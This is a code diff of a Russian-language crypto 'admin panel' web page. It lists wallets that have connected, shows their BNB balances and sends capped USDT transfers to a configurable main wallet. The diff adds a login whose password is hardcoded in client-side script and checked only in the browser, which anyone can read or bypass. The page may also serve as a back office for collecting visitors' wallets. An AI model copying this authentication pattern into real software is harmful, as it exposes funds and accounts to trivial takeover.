@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Панель администратора</title>
+    <title>Admin Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
@@ -61,23 +61,45 @@
             margin-bottom: 4px;
         }
 
+        .login-form {
+            max-width: 400px;
+            margin: 50px auto;
+            text-align: center;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 14px;
+            margin: 15px 0;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(0,255,157,0.3);
+            border-radius: 12px;
+            color: white;
+            font-size: 1rem;
+        }
+
+        .login-form input::placeholder { color: #888; }
+
+        .login-form button {
+            padding: 14px;
+            font-size: 1rem;
+            font-weight: 600;
+            background: linear-gradient(90deg, #00ff9d, #00cc88);
+            color: black;
+            border: none;
+            border-radius: 16px;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .login-form button:hover { transform: translateY(-2px); }
+
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 30px;
-        }
-
-        .header-info {
-            font-size: 0.9rem;
-            color: #aaa;
-        }
-
-        .header-info .label {
-            display: block;
-            font-size: 0.75rem;
-            color: #666;
-            text-transform: uppercase;
         }
 
         button {
@@ -136,24 +158,11 @@
             margin-bottom: 10px;
         }
 
-        .wallet-card .network {
-            font-size: 0.8rem;
-            color: #aaa;
-            margin-bottom: 15px;
-        }
-
         .wallet-card .balance {
             font-size: 1.2rem;
             font-weight: 600;
             color: #fff;
             margin-bottom: 10px;
-        }
-
-        .wallet-card .tokens {
-            font-size: 0.8rem;
-            color: #888;
-            border-top: 1px solid rgba(255,255,255,0.1);
-            padding-top: 10px;
         }
 
         .transfer-panel {
@@ -167,6 +176,15 @@
         .transfer-panel h2 {
             color: #00ff9d;
             margin-top: 0;
+        }
+
+        .limit-warning {
+            background: rgba(255, 193, 7, 0.15);
+            border-left: 5px solid #ff6b6b;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #ff9999;
         }
 
         input {
@@ -221,27 +239,46 @@
 
         .hidden { display: none; }
 
-        .warning {
-            background: rgba(255, 107, 107, 0.1);
-            border-left-color: #ff5f6d;
-            color: #ff9999;
+        .header-info {
+            font-size: 0.9rem;
+            color: #aaa;
+        }
+
+        .header-info .label {
+            display: block;
+            font-size: 0.75rem;
+            color: #666;
+            text-transform: uppercase;
         }
     </style>
 </head>
 <body>
     <div class="background-icons" id="icons"></div>
 
-    <div class="container">
+    <!-- Login Screen -->
+    <div id="loginScreen" class="container">
+        <div class="login-form">
+            <h1>🔐 Admin Panel</h1>
+            <p style="color: #aaa; margin-bottom: 30px;">Введи пароль для доступа</p>
+            <input type="password" id="passwordInput" placeholder="Пароль" onkeypress="if(event.key==='Enter') loginAdmin()">
+            <button onclick="loginAdmin()"><i class="fas fa-lock-open"></i> Войти</button>
+            <div id="loginError"></div>
+        </div>
+    </div>
+
+    <!-- Admin Screen -->
+    <div id="adminScreen" class="container hidden">
         <div class="header">
             <div>
-                <h1>📊 Админ панель</h1>
+                <h1>📊 Admin Panel</h1>
             </div>
-            <button class="back" onclick="goBack()"><i class="fas fa-arrow-left"></i> Назад на сайт</button>
+            <button class="back" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Выход</button>
         </div>
 
         <div class="header-info">
             <span class="label">Основной кошелёк:</span>
             <span id="mainWallet">0xa283ce959c5d0491bbe21b1687b46bf5090a7164</span>
+            <button onclick="editMainWallet()" style="margin-left: 10px; padding: 5px 10px; font-size: 0.8rem;">Изменить</button>
         </div>
 
         <h2 style="color: #00ff9d; margin-top: 30px;">Подключённые кошельки</h2>
@@ -250,16 +287,15 @@
         <div class="transfer-panel" id="transferPanel" style="display: none;">
             <h2><i class="fas fa-paper-plane"></i> Отправить перевод</h2>
             
+            <div class="limit-warning">
+                ⚠️ <strong>Максимум 10 USDT!</strong> Каждый перевод ограничен 10 USDT для безопасности
+            </div>
+
             <div id="selectedWallet"></div>
             
             <div class="transfer-form">
-                <input type="text" id="transferAmount" placeholder="Сумма (например 0.5)">
-                <select id="transferToken" style="padding: 14px; background: rgba(255,255,255,0.08); border: 1px solid rgba(0,255,157,0.3); border-radius: 12px; color: white;">
-                    <option value="native">Нативная монета</option>
-                    <option value="usdt">USDT</option>
-                    <option value="usdc">USDC</option>
-                </select>
-                <button onclick="performTransfer()" style="background: linear-gradient(90deg, #ff5f6d, #ff3d5a); color: #fff;"><i class="fas fa-paper-plane"></i> Отправить</button>
+                <input type="number" id="transferAmount" placeholder="Сумма USDT (макс 10)" step="0.01" min="0" max="10">
+                <button onclick="performTransfer()" style="grid-column: 2; background: linear-gradient(90deg, #ff5f6d, #ff3d5a); color: #fff;"><i class="fas fa-paper-plane"></i> Отправить</button>
             </div>
 
             <div id="transferStatus"></div>
@@ -278,6 +314,9 @@
             icon.style.animationDelay = -Math.random()*40 + 's';
             iconsContainer.appendChild(icon);
         }
+
+        const ADMIN_PASSWORD = '1488';
+        const MAX_TRANSFER = 10; // USDT
 
         const ETHERS_SOURCES = [
             'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js',
@@ -307,40 +346,45 @@
             throw new Error('Не удалось загрузить ethers.js');
         }
 
-        const TOKENS = {
-            '0x38': [
-                { name: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
-                { name: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 },
-            ],
-            '0x1': [
-                { name: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
-                { name: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
-            ]
-        };
+        function loginAdmin() {
+            const password = document.getElementById('passwordInput').value;
+            const error = document.getElementById('loginError');
 
-        const CHAINS = {
-            '0x38': { name: 'BNB Smart Chain', nativeSymbol: 'BNB', rpc: 'https://bsc-dataseed.binance.org:443' },
-            '0x1': { name: 'Ethereum', nativeSymbol: 'ETH', rpc: 'https://eth.publicnode.com' }
-        };
+            if (password === ADMIN_PASSWORD) {
+                sessionStorage.setItem('adminAuthenticated', 'true');
+                document.getElementById('loginScreen').classList.add('hidden');
+                document.getElementById('adminScreen').classList.remove('hidden');
+                loadWallets();
+            } else {
+                error.innerHTML = '<div class="status error">❌ Неверный пароль</div>';
+                document.getElementById('passwordInput').value = '';
+            }
+        }
 
-        const ERC20_ABI = ['function decimals() view returns (uint8)', 'function balanceOf(address) view returns (uint256)'];
+        function logout() {
+            sessionStorage.removeItem('adminAuthenticated');
+            document.getElementById('loginScreen').classList.remove('hidden');
+            document.getElementById('adminScreen').classList.add('hidden');
+            document.getElementById('passwordInput').value = '';
+        }
 
-        let selectedWallet = null;
-        let providers = {};
+        function checkAuthentication() {
+            if (!sessionStorage.getItem('adminAuthenticated')) {
+                document.getElementById('adminScreen').classList.add('hidden');
+                document.getElementById('loginScreen').classList.remove('hidden');
+            }
+        }
 
-        async function getBalance(address, chainId) {
+        async function getBalance(address) {
             try {
-                if (!providers[chainId]) {
-                    const rpc = CHAINS[chainId].rpc;
-                    const response = await fetch(rpc, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1 })
-                    });
-                    const data = await response.json();
-                    if (data.result) {
-                        return parseInt(data.result, 16) / (10 ** 18);
-                    }
+                const response = await fetch('https://bsc-dataseed.binance.org:443', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1 })
+                });
+                const data = await response.json();
+                if (data.result) {
+                    return parseInt(data.result, 16) / (10 ** 18);
                 }
             } catch (e) {
                 console.error('Ошибка при чтении баланса:', e);
@@ -361,21 +405,21 @@
             }
 
             for (const wallet of wallets) {
-                const balance = await getBalance(wallet.address, wallet.chainId);
-                const chainName = CHAINS[wallet.chainId]?.name || wallet.network;
+                const balance = await getBalance(wallet.address);
 
                 const card = document.createElement('div');
                 card.className = 'wallet-card';
                 card.innerHTML = `
                     <div class="address">${wallet.address.slice(0, 6)}...${wallet.address.slice(-4)}</div>
-                    <div class="network">${chainName}</div>
-                    <div class="balance">${balance.toFixed(4)} ${CHAINS[wallet.chainId]?.nativeSymbol || 'BNB'}</div>
-                    <div class="tokens">Подключен: ${new Date(wallet.timestamp).toLocaleDateString('ru-RU')}</div>
+                    <div class="balance">${balance.toFixed(4)} BNB</div>
+                    <div style="font-size: 0.8rem; color: #888;">Подключен: ${new Date(wallet.timestamp).toLocaleDateString('ru-RU')}</div>
                 `;
                 card.onclick = () => selectWallet(wallet, card);
                 grid.appendChild(card);
             }
         }
+
+        let selectedWallet = null;
 
         function selectWallet(wallet, card) {
             document.querySelectorAll('.wallet-card').forEach(c => c.classList.remove('selected'));
@@ -387,10 +431,10 @@
 
             const selected = document.getElementById('selectedWallet');
             selected.innerHTML = `
-                <div class="status warning">
+                <div class="status" style="border-left-color: #ffc107;">
                     <strong>Выбран кошелёк:</strong> ${wallet.address}<br>
-                    <strong>Сеть:</strong> ${CHAINS[wallet.chainId]?.name || wallet.network}<br>
-                    <strong>Будет отправлено на:</strong> ${document.getElementById('mainWallet').textContent}
+                    <strong>На этот адрес:</strong> ${document.getElementById('mainWallet').textContent}<br>
+                    <strong>Максимум за раз:</strong> ${MAX_TRANSFER} USDT
                 </div>
             `;
         }
@@ -398,16 +442,20 @@
         async function performTransfer() {
             if (!selectedWallet) return;
 
-            const amount = document.getElementById('transferAmount').value;
-            const tokenType = document.getElementById('transferToken').value;
+            const amount = parseFloat(document.getElementById('transferAmount').value);
 
-            if (!amount || parseFloat(amount) <= 0) {
+            if (!amount || amount <= 0) {
                 showStatus('Введи корректную сумму', true);
                 return;
             }
 
+            if (amount > MAX_TRANSFER) {
+                showStatus(`❌ Максимум ${MAX_TRANSFER} USDT! Ты указал ${amount}`, true);
+                return;
+            }
+
             if (!window.ethereum) {
-                showStatus('Для выполнения транзакции подключи кошелёк в MetaMask/Trust Wallet', true);
+                showStatus('Для выполнения транзакции подключи MetaMask/Trust Wallet', true);
                 return;
             }
 
@@ -420,24 +468,26 @@
                 const signerAddress = await signer.getAddress();
 
                 if (signerAddress.toLowerCase() !== selectedWallet.address.toLowerCase()) {
-                    showStatus('❌ Выбранный кошелёк не совпадает с подключённым в MetaMask/Trust Wallet', true);
+                    showStatus('❌ Выбранный кошелёк не совпадает с подключённым', true);
                     return;
                 }
 
                 const mainWallet = document.getElementById('mainWallet').textContent;
+                const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; // USDT на BSC
+                
+                // ERC20 Transfer ABI
+                const ERC20_ABI = [
+                    'function transfer(address to, uint256 amount) returns (bool)',
+                    'function balanceOf(address) returns (uint256)'
+                ];
 
-                if (tokenType === 'native') {
-                    const tx = await signer.sendTransaction({
-                        to: mainWallet,
-                        value: ethers.utils.parseEther(amount)
-                    });
-                    showStatus(`✅ Транзакция отправлена!<br><small>${tx.hash}</small>`);
-                    await tx.wait();
-                    showStatus(`✅ Транзакция подтверждена!<br><small>${tx.hash}</small>`);
-                } else {
-                    showStatus('Переводы токенов пока в разработке', true);
-                }
+                const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
+                const amountWei = ethers.utils.parseEther(amount.toString());
 
+                const tx = await contract.transfer(mainWallet, amountWei);
+                showStatus(`✅ Транзакция отправлена!<br><small>${tx.hash}</small>`);
+                await tx.wait();
+                showStatus(`✅ Перевод ${amount} USDT выполнен!<br><small>${tx.hash}</small>`);
                 document.getElementById('transferAmount').value = '';
             } catch (e) {
                 showStatus(`❌ Ошибка: ${e.message || e}`, true);
@@ -449,12 +499,26 @@
             status.innerHTML = `<div class="status ${isError ? 'error' : ''}">${message}</div>`;
         }
 
-        function goBack() {
-            window.location.href = 'index.html';
+        function editMainWallet() {
+            const newWallet = prompt('Введи адрес основного кошелька:', document.getElementById('mainWallet').textContent);
+            if (newWallet) {
+                if (newWallet.match(/^0x[a-fA-F0-9]{40}$/)) {
+                    document.getElementById('mainWallet').textContent = newWallet;
+                    localStorage.setItem('mainWallet', newWallet);
+                } else {
+                    alert('❌ Некорректный адрес');
+                }
+            }
         }
 
-        // Загружаем кошельки при открытии
-        loadWallets();
+        // При загрузке страницы проверяем аутентификацию
+        checkAuthentication();
+
+        // Восстанавливаем основной кошелёк из памяти
+        const saved = localStorage.getItem('mainWallet');
+        if (saved) {
+            document.getElementById('mainWallet').textContent = saved;
+        }
     </script>
 </body>
 </html>
